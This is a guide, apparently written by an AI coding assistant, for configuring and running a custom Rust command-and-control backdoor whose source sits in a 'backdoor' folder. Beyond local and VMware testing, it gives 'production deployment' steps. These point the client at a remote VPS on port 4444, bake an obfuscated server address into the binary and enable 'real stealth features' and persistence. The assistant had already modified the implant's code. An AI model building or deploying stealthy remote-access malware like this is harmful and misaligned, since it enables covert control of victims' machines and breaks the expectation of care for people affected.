# 🧪 C2 Testing Configuration Guide

## 🎯 Your Current Setup
- **Host Machine**: 192.168.1.41 (where C2 server should run)
- **VMware Guest**: 192.168.1.41 (same IP - this is the issue!)

## 📋 Testing Scenarios

### **Scenario 1: Proper Host-Guest Testing (RECOMMENDED)**

#### **Step 1: Fix VMware Network Settings**
1. **VMware Workstation/Player Settings**:
   - VM → Settings → Network Adapter
   - Change from "NAT" to "Bridged" mode
   - OR keep NAT but the guest will get different IP

2. **Check Guest IP** (in VMware Windows):
```cmd
ipconfig
# Should show something like: 192.168.1.42 (different from host)
```

#### **Step 2: Configure and Test**
**On Host (192.168.1.41)**:
```bash
# Run C2 Server
cd c:\Users\Undead\Desktop\backdoor\output
.\c2_server.exe
```

**On VMware Guest (192.168.1.42)**:
```cmd
# Copy c2_client.exe to guest, then run:
c2_client.exe --server 192.168.1.41 --no-stealth --no-persistence
```

---

### **Scenario 2: Same Machine Testing (Current Setup)**

Since both are on same IP, we'll use localhost:

#### **Modified Client Code**
✅ **Already updated your code to use 127.0.0.1 by default**

#### **Quick Test**
```bash
# Terminal 1 - Start Server
cd c:\Users\Undead\Desktop\backdoor\output
.\c2_server.exe

# Terminal 2 - Start Client  
cd c:\Users\Undead\Desktop\backdoor\output
.\c2_client.exe --no-stealth --no-persistence
```

#### **Use Test Script**
```bash
cd c:\Users\Undead\Desktop\backdoor
.\test_local.bat
```

---

### **Scenario 3: Production Deployment**

#### **Method 1: Quick Command Line Override**
```bash
# Connect to your VPS/Cloud server
.\c2_client.exe --server YOUR_VPS_IP --port 4444

# Examples:
.\c2_client.exe --server 203.0.113.10 --port 4444
.\c2_client.exe --server example.com --port 4444
.\c2_client.exe --server myc2server.com --port 4444
```

#### **Method 2: Configure and Build for Production**
```bash
# Use the production configuration script
.\configure_production.bat

# This will:
# 1. Ask for your server IP/domain
# 2. Update the source code
# 3. Build production binaries
# 4. Create deployment package
```

#### **Method 3: Manual Code Modification**
Edit `c2_client\src\main.rs`:
```rust
// Line ~21: Change default server
#[arg(short, long, default_value = "YOUR_VPS_IP")]
server: String,

// Line ~51: Change release mode server
server: obfuscate_string("YOUR_VPS_IP"),
```

Then rebuild:
```bash
.\build.bat
```

---

### **Scenario 4: Cross-Network Testing**

#### **Server on Different Machine**
1. **Host the server** on another machine (e.g., 192.168.1.100)
2. **Update client config**:
```bash
# Option A: Command line
.\c2_client.exe --server 192.168.1.100 --no-stealth

# Option B: Edit the code and rebuild
# Change default server IP in main.rs line 21
```

---

## 🔧 Configuration Files

### **Client Config (client_config.toml)**
```toml
[network]
server_address = "192.168.1.41"
server_port = 4444
reconnect_delay = 30
heartbeat_interval = 60
command_poll_interval = 5
max_reconnect_attempts = 0

[features]
persistence_enabled = false
stealth_mode = false
```

### **Server Config (server_config.toml)**
```toml
[network]
bind_address = "0.0.0.0"
bind_port = 4444

[security]
rsa_key_size = 2048
heartbeat_timeout = 300

[features]
enable_logging = true
log_file = "c2_server.log"
```

---

## 🚀 Quick Commands for Your Setup

### **For VMware Host-Guest Testing:**
```bash
# Find VMware guest IP
# In guest: ipconfig | findstr IPv4

# Run server on host (192.168.1.41)
.\c2_server.exe

# Run client on guest (connecting back to host)
.\c2_client.exe --server 192.168.1.41 --no-stealth --no-persistence
```

### **For Same Machine Testing:**
```bash
# Use the modified code (already done)
.\c2_server.exe
.\c2_client.exe --no-stealth --no-persistence
```

### **For Production Deployment:**
```bash
# Option A: Use configuration script
.\configure_production.bat

# Option B: Command line override
.\c2_client.exe --server YOUR_VPS_IP --port 4444

# Option C: Build with custom server
# Edit source code, then:
.\build.bat
```

---

## 🔍 Troubleshooting

### **Connection Issues:**
```bash
# Test connectivity
telnet 192.168.1.41 4444

# Check firewall
# Windows: Allow port 4444 in Windows Firewall
# VMware: Check VM network settings
```

### **IP Configuration Issues:**
```bash
# Check your network setup
ipconfig /all

# Verify VMware network
# VMware → Edit → Virtual Network Editor
```

### **Process Issues:**
```bash
# Kill existing server
taskkill /f /im c2_server.exe

# Check port usage
netstat -ano | findstr :4444
```

---

## ✅ Recommended Testing Flow

1. **Local Testing First**: Use same machine with 127.0.0.1
2. **VMware Testing**: Host-guest with proper network setup  
3. **Network Testing**: Different machines on same network
4. **Production Testing**: VPS with real stealth features

**Your code is now configured for localhost testing by default!** 🎉
